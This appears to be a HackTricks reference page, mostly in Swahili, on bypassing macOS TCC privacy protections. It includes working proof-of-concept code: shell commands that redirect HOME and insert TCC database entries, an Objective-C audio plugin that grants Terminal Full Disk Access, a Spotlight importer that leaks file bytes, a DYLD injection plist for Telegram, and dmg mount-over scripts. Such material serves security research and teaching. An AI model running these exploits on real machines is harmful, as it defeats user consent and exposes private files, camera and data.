# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Kwa utendaji

### Write Bypass

Hii si bypass, ni jinsi tu TCC inavyofanya kazi: **Hailindi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji, bado inaweza kuandika humo**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Sifa ya **extended attribute `com.apple.macl`** huongezwa kwenye **file** mpya ili kuipa **app iliyoiumba** ruhusa ya kuisoma.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Inawezekana **kuweka dirisha juu ya kidokezo cha TCC** ili kumfanya mtumiaji **akubali** bila kugundua. Unaweza kupata PoC katika [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Mshambulizi anaweza **kuunda apps zenye jina lolote** (k.m. Finder, Google Chrome...) katika **`Info.plist`** na kuzifanya ziombe ufikiaji wa eneo fulani linalolindwa na TCC. Mtumiaji atadhani kuwa programu halali ndiyo inayoomba ufikiaji huu.\
Zaidi ya hayo, inawezekana **kuondoa app halali kwenye Dock na kuweka ile bandia hapo**, ili mtumiaji anapobofya ile bandia (ambayo inaweza kutumia ikoni ileile) iweze kuita ile halali, kuomba ruhusa za TCC na kutekeleza malware, na kumfanya mtumiaji aamini kuwa app halali ndiyo iliyoomba ufikiaji huo.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC zinapatikana katika:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa chaguomsingi, ufikiaji kupitia **SSH ulikuwa na "Full Disk Access"**. Ili kuizima, lazima iwe kwenye orodha lakini iwe imezimwa (kuiondoa kwenye orodha hakuondoi ruhusa hizo):<sup>[[2]](#references)</sup>

![Ombi la TCC kwa jina lolote - SSH Bypass: Kwa chaguomsingi, ufikiaji kupitia SSH ulikuwa na "Full Disk Access". Ili kuizima, lazima iwe kwenye orodha lakini iwe imezimwa (kuiondoa...](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malwares zilivyoweza kukwepa ulinzi huu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Kumbuka kuwa sasa, ili uweze kuwezesha SSH, unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Sifa ya **`com.apple.macl`** hupewa files ili kuipa **application fulani ruhusa ya kuzisoma.** Sifa hii huwekwa unapofanya **drag\&drop** ya file juu ya app, au mtumiaji **anapobofya mara mbili** file ili kuifungua kwa **application chaguomsingi**.

Kwa hiyo, mtumiaji anaweza **kusajili app hasidi** ishughulikie extensions zote na kuiita Launch Services ili **ifungue** file yoyote (hivyo file hasidi itapewa ruhusa ya kusomwa).<sup>[[23]](#references)</sup>

### iCloud

Entitlement ya **`com.apple.private.icloud-account-access`** huwezesha kuwasiliana na huduma ya XPC **`com.apple.iCloudHelper`**, ambayo **hutoa iCloud tokens**.

**iMovie** na **Garageband** zilikuwa na entitlement hii na nyingine zilizoruhusu ufikiaji huo.

Kwa **maelezo** zaidi kuhusu exploit ya **kupata iCloud tokens** kupitia entitlement hiyo, tazama mazungumzo haya: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Spotlight importer data-leak kupitia majina ya Darwin notification

Spotlight importer inaweza kusoma file ambayo Spotlight hupitisha kwenye callback yake ya `GetMetadataForFile`, hata wakati process ya kawaida isiyo na Full Disk Access haiwezi kuisoma. Tofauti na [code injection kwenye process iliyoidhinishwa na TCC](../macos-tcc-credential-and-data-theft.md), njia hii inahitaji foothold ya ndani inayoweza kusakinisha importer na tukio linalolingana la Spotlight indexing. Importer iko kwenye sandbox, lakini Darwin notifications zinazotumia majina pekee zinaweza kupeleka bytes kwa listener aliye nje ya sandbox hiyo. Hii ni njia ya data-leak, si njia ya kupata root au ufikiaji wa arbitrary files kutoka kwa importer.<sup>[[24]](#references)</sup>

Tangaza aina ya file lengwa chini ya `CFBundleDocumentTypes` → `LSItemContentTypes` kwenye `Info.plist` ya importer, kisha sakinisha bundle kwenye `~/Library/Spotlight/` au `Contents/Library/Spotlight/` ya app. Kagua usajili kwa `mdimport -L`. Sehemu ya [Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) inaeleza uwekaji wa bundle na ulinganishaji wa aina za files. Importer hupokea tu files ambazo Spotlight imeichagua; kwa kawaida, importer iliyopo tayari hupewa kipaumbele. Kwenye macOS 26 Tahoe, `mdimport -i` haikulazimisha indexing ya haraka na ya kurudia kwa uhakika kwenye majaribio yaliyoripotiwa, huku `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ikiomba kufanywa upya kwa indexing ya UTIs zinazodaiwa na importer hiyo.<sup>[[24]](#references)</sup>

Ili kujaribu channel, anzisha listener nje ya sandbox kwa `notifyutil -w TEST_TEST_TEST`, kisha tuma notification kwa `CFNotificationCenterGetDarwinNotifyCenter()` na object na `userInfo` zikiwa `NULL`. Tofauti na distributed notification yenye payload ya `userInfo`, Darwin notification ina jina lake pekee. Kwa data ya binary, sajili listener wa nje kwa majina ya desimali `0` hadi `255` ukitumia `notify_register_dispatch`; linganisha kila usajili wa callback na thamani yake ya byte. Ndani ya `GetMetadataForFile`, soma tu `pathToFile` iliyotolewa na Spotlight na tuma kila byte kama jina la notification la desimali:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Msikilizaji huunda upya mfuatano wa byte badala ya kusoma faili iliyolindwa na TCC yenyewe. PoC iliyochapishwa ilirejesha byte 64 za kwanza za `knowledgeC.db` kutoka kwenye terminal isiyo na FDA huku SIP ikiwa imewashwa kwenye macOS 26. Hii ina bandwidth ndogo na si njia ya kuaminika ya kunakili data nyingi: Spotlight huenda isifanye indexing au indexing upya ya faili lengwa, na instances za importer zinazoendeshwa kwa wakati mmoja zinaweza kuchanganya mitiririko ya arifa. Tazama [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) kwa mbinu nyingine za kuvuka mipaka ya sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

App yenye ruhusa ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Apps nyingine**. Hii inamaanisha kwamba inaweza **kutumia vibaya ruhusa zilizopewa Apps hizo nyingine**.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu Apple Scripts, angalia:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **ruhusa ya Automation kwa `iTerm`**, kama katika mfano huu ambapo **`Terminal`** ina ufikiaji wa iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Kupitia iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo ina FDA, na kuitumia kutekeleza vitendo:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Kupitia Finder

Au ikiwa App ina ufikiaji kupitia Finder, inaweza kutumia script kama hii:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Kwa tabia ya App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** ya userland ilikuwa ikitumia kigezo cha **`HOME`** cha **env** kufikia database ya TCC ya watumiaji kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa kuwa daemon ya TCC inaendeshwa kupitia `launchd` ndani ya domain ya mtumiaji wa sasa, inawezekana **kudhibiti vigezo vyote vya mazingira** vinavyopitishwa kwake.<sup>[[19]](#references)</sup>\
Kwa hivyo, **mshambuliaji anaweza kuweka kigezo cha mazingira `$HOME`** katika **`launchctl`** kielekeze kwenye **directory** **inayodhibitiwa**, **kuwasha upya** daemon ya **TCC**, kisha **kubadilisha moja kwa moja database ya TCC** ili kujipa **kila haki ya TCC inayopatikana** bila kumtaka mtumiaji wa mwisho athibitishe chochote.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes ilikuwa na ufikiaji wa maeneo yaliyolindwa na TCC, lakini note mpya iliundwa **katika eneo lisilolindwa**. Kwa hiyo, mshambuliaji angeweza kuiomba Notes inakili faili iliyolindwa kwenye note, kisha afikie data iliyotokana nayo kutoka eneo lisilolindwa:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` yenye library `libsecurity_translocate` ilikuwa na entitlement `com.apple.private.nullfs_allow` iliyoiruhusu kuunda mount ya **nullfs**, na entitlement `com.apple.private.tcc.allow` yenye **`kTCCServiceSystemPolicyAllFiles`** ili kufikia kila faili.

Iliwezekana kuongeza sifa ya quarantine kwenye "Library", kuita huduma ya XPC ya **`com.apple.security.translocation`**, kisha Library ingewekwa kwenye **`$TMPDIR/AppTranslocation/d/d/Library`**, ambapo nyaraka zote zilizo ndani ya Library zingeweza **kufikiwa**.

### CVE-2024-44131 - FileProvider symlink race

Apps zinazokabidhi shughuli za faili kwa **privileged helper** (hapa **`fileproviderd`** / `Files.app`) hunakili au kuhamisha vipengee **kwa niaba ya mtumiaji**, kwa hivyo nakala hutekelezwa kwa privileges za helper badala ya za mwito.

Jamf Threat Labs ilionyesha kuwa ukaguzi wa symlink unaofanywa kabla ya operesheni unaweza **kushindaniwa**: badala ya kuweka symlink kwenye kipengee cha mwisho cha njia (ambacho hukaguliwa), mshambuliaji hubadilisha directory ya kati ya njia **baada ya nakala kuanza**. Kisha privileged helper hufuata link inayodhibitiwa na mshambuliaji na kusoma/kuandika kwenye maeneo yaliyolindwa na TCC **bila kuonyesha prompt yoyote**.<sup>[[5]](#references)</sup>

Directories ambazo njia zake **hazijalindwa** na UUID ya nasibu (kwa mfano `~/Library/Mobile Documents/com~apple~CloudDocs`) ndizo shabaha rahisi zaidi, kwa sababu mshambuliaji anaweza kutabiri njia kamili ya kushindania.

> [!TIP]
> Huu ndio muundo wa jumla wa kutafuta: **mchakato wowote wenye privileges unaotatua njia zaidi ya mara moja** (kagua-kisha-tumia, au `rename()`/`copyfile()` zinazotatua chanzo na lengwa kando) unaweza kushindaniwa kwa kubadilisha directory katikati ya njia. Ni `O_NOFOLLOW_ANY`, `openat()` kwenye directory FD ambayo tayari imefunguliwa, au `realpath()` + uthibitishaji upya pekee zinazofunga mwanya huu.

Maelezo zaidi katika [**makala ya Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` inaweza kujengwa ikiwa na `SQLITE_ENABLE_SQLLOG`, inayoongeza hook ya logging inayoendeshwa na environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – kwa **kila database inayofunguliwa**, **nakala ya faili ya database** na logi ya SQL statements huandikwa kwenye `path` (directory lazima iwepo tayari).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – tengeneza **nakala mpya kila mara** DB inapofunguliwa/kuambatishwa badala ya kutumia tena nakala iliyopo.
- **`SQLITE_SQLLOG_CONDITIONAL`** – rekodi connection ikiwa tu faili ya `<database>-sqllog` ipo karibu na DB kuu.

Ukiweza kuingiza variable hii kwenye mchakato wenye **FDA** unaofungua SQLite databases, utanakili kwa urahisi **databases hizo zilizolindwa** hadi kwenye directory unayoidhibiti. Kwa kuwa jina la faili la lengwa linatokana na data inayodhibitiwa na mshambuliaji, **symlink iliyowekwa kwenye lengwa** hubadilisha primitive hiyo hiyo kuwa **uandishi wa faili kiholela** kwa kutumia privileges za mchakato lengwa.

### **SQLITE_AUTO_TRACE**

Ikiwa environment variable **`SQLITE_AUTO_TRACE`** imewekwa, library **`libsqlite3.dylib`** itaanza **kurekodi** maswali yote ya SQL. Applications nyingi zilitumia library hii, kwa hiyo iliwezekana kurekodi maswali yote ya SQLite ya applications hizo.<sup>[[22]](#references)</sup>

Applications kadhaa za Apple zilitumia library hii kufikia taarifa zilizolindwa na TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Kutafuta writes za faili zinazoendeshwa na env-var

Mifano miwili iliyotangulia ni matukio ya mbinu ileile ya jumla, na inafaa kutafuta mingine: **frameworks zinazopakiwa kwenye apps zilizo na ruhusa za TCC mara nyingi hutoa environment variables za debug/logging zinazofanya process itengeneze faili kwenye path inayodhibitiwa na caller**.

Mchakato wa kuzipata:

1. Chagua target yenye FDA au ruhusa nyingine muhimu ya TCC (`Music`, `TV`, `Terminal`, MDM agents...) na orodhesha frameworks inazounganisha (`otool -L`, `vmmap`).
2. Tafuta strings za `getenv` kwenye frameworks hizo: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Weka candidate variables kwa kutumia `launchctl setenv NAME /path/you/control`, zindua app na uangalie inachofanya kwenye filesystem kwa `fs_usage -w -f filesys <pid>` au `sudo fs_usage | grep <path>`.
4. Ikiwa process **itatengeneza au kubadilisha jina la** faili kwenye directory yako, una write primitive: elekeza destination kwenye symlink (au shindana kuingilia directory ya kati, kama ilivyo kwenye CVE-2024-44131 hapo juu) ili kuelekeza faili kwenye `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Kuna mambo mawili yanayowekea hili mipaka. Kwanza, **variables za `DYLD_*` hupuuzwa kwa binaries zenye hardened runtime** isipokuwa app iwe na entitlement ya [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("thamani ya Boolean inayoonyesha kama app inaweza kuathiriwa na environment variables za dynamic linker, ambazo unaweza kutumia kuingiza code kwenye process ya app") — tazama pia [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Pili, Apple huondoa debug variables za framework moja moja baada ya kuripotiwa, kwa hiyo variable iliyofanya kazi kwenye toleo moja la macOS mara nyingi huwa imeondolewa kwenye toleo linalofuata. Ikiwa app itakataa kimyakimya kuzinduliwa baada ya kuiweka, chukulia variable hiyo kuwa tayari imechujwa.<sup>[[7]](#references)[[8]](#references)</sup>

Tazama [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) kwa ujanja sawia unaotumia linker variables.

### Apple Remote Desktop

Ukiwa root unaweza kuwasha huduma hii na **ARD agent itakuwa na full disk access**, ambayo mtumiaji anaweza kutumia vibaya kuifanya inakili **database mpya ya TCC ya mtumiaji**.

## Kwa kutumia **NFSHomeDirectory**

TCC hutumia database iliyo kwenye folda ya HOME ya mtumiaji kudhibiti ufikiaji wa resources maalum kwa mtumiaji kwenye **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, ikiwa mtumiaji ataweza kuwasha upya TCC huku akiwa na env variable ya $HOME inayoelekeza kwenye **folda tofauti**, mtumiaji anaweza kuunda database mpya ya TCC kwenye **/Library/Application Support/com.apple.TCC/TCC.db** na kuidanganya TCC ipe app yoyote ruhusa yoyote ya TCC.

> [!TIP]
> Kumbuka kuwa Apple hutumia setting iliyohifadhiwa kwenye profile ya mtumiaji ndani ya attribute ya **`NFSHomeDirectory`** kama **thamani ya `$HOME`**, kwa hiyo ukidhibiti app yenye ruhusa ya kurekebisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **weaponize** chaguo hili kwa TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** hutumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kurekebisha folda ya **HOME** ya mtumiaji.

1. Pata blob ya _csreq_ ya app lengwa.
2. Weka faili bandia ya _TCC.db_ yenye access inayohitajika na blob ya _csreq_.
3. Export ingizo la Directory Services la mtumiaji kwa kutumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Rekebisha ingizo la Directory Services ili kubadilisha home directory ya mtumiaji.
5. Import ingizo la Directory Services lililorekebishwa kwa kutumia [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha _tccd_ ya mtumiaji na uwashe upya process.

POC ya pili ilitumia **`/usr/libexec/configd`**, ambayo ilikuwa na `com.apple.private.tcc.allow` yenye thamani ya `kTCCServiceSystemPolicySysAdminFiles`.\
Iliwezekana kuendesha **`configd`** kwa chaguo la **`-t`**, ambalo lilimwezesha mshambuliaji kubainisha **Bundle maalum ya kupakia**. Kwa hiyo, exploit **inabadilisha** mbinu ya **`dsexport`** na **`dsimport`** ya kubadilisha home directory ya mtumiaji na kutumia **code injection kupitia `configd`**.

Kwa maelezo zaidi, angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Kwa kutumia process injection

Kuna mbinu tofauti za kuingiza code ndani ya process na kutumia vibaya ruhusa zake za TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Zaidi ya hayo, process injection inayopatikana mara nyingi zaidi kwa ajili ya kupita TCC ni kupitia **plugins (load library)**.\
Plugins ni code ya ziada, kwa kawaida katika mfumo wa libraries au plist, ambayo **hupakiwa na app kuu** na kutekelezwa ndani ya muktadha wake. Kwa hiyo, ikiwa app kuu ilikuwa na ufikiaji wa faili zilizozuiliwa na TCC (kupitia ruhusa zilizotolewa au entitlements), **code maalum pia itakuwa nao**.

### CVE-2020-27937 - Directory Utility

App `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na entitlement ya **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye extension ya **`.daplug`** na **haikuwa na** hardened runtime.

Ili weaponize CVE hii, **`NFSHomeDirectory`** **hubadilishwa** (kwa kutumia vibaya entitlement iliyotangulia) ili **kuchukua udhibiti wa database ya TCC ya mtumiaji** na kupita TCC.

Kwa maelezo zaidi, angalia [**ripoti ya awali**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **inaruhusu code injection**, na ya pili inaipa ufikiaji wa **kusimamia TCC**.

Binary hii iliruhusu kupakia **plug-ins za third-party** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, iliwezekana **kupakia plugin na kutumia vibaya ruhusa za TCC** kwa POC hii:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Kwa maelezo zaidi, angalia [**ripoti asilia**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Programu-jalizi za Device Abstraction Layer (DAL)

Programu za mfumo zinazofungua stream ya kamera kupitia Core Media I/O (programu zenye **`kTCCServiceCamera`**) hupakia **programu-jalizi hizi ndani ya mchakato** kutoka `/Library/CoreMediaIO/Plug-Ins/DAL` (hazizuiliwi na SIP).

Kuweka tu library yenye **constructor** ya kawaida hapo kutatosha **kuingiza code**.

Programu kadhaa za Apple ziliathiriwa na udhaifu huu.

### Firefox

Programu ya Firefox ilikuwa na entitlements za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia udhaifu huu kwa urahisi, [**angalia ripoti asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, zilizowezesha kuingiza code ndani ya process na kutumia TCC privileges.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo iliwezekana kuitumia vibaya **kupata ufikiaji wa ruhusa zake**, kama vile kurekodi kwa kutumia kamera. Unaweza [**kupata payload kwenye writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Kumbuka kwamba ili kutumia env variable kupakia library, **custom plist** iliundwa ili kuingiza library hiyo, na **`launchctl`** ilitumika kuizindua:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Kwa kutumia open

Inawezekana kutumia **`open`** hata ukiwa kwenye sandbox

### Skripti za Terminal

Ni kawaida sana kuipa Terminal **Full Disk Access (FDA)**, angalau kwenye kompyuta zinazotumiwa na watu wa teknolojia. Pia inawezekana kutumia skripti za **`.terminal`** nayo.

Skripti za **`.terminal`** ni faili za plist kama hii, zikiwa na amri ya kutekeleza kwenye ufunguo wa **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua kwa amri kama:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Kwa kuweka mount

### CVE-2020-9771 - mount_apfs TCC bypass na privilege escalation

**Mtumiaji yeyote** (hata wasio na privileged) anaweza kuunda na kuweka mount snapshot ya Time Machine na **kufikia faili ZOTE** za snapshot hiyo.\
**Privilege pekee** inayohitajika ni kwa application inayotumika (kama `Terminal`) kuwa na ruhusa ya **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ambayo lazima itolewe na admin.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Maelezo ya kina zaidi [**yanapatikana kwenye ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount juu ya faili ya TCC

Hata kama faili ya TCC DB ilikuwa imelindwa, iliwezekana **ku-mount faili mpya ya TCC.db juu ya directory**:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Angalia **full exploit** katika [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

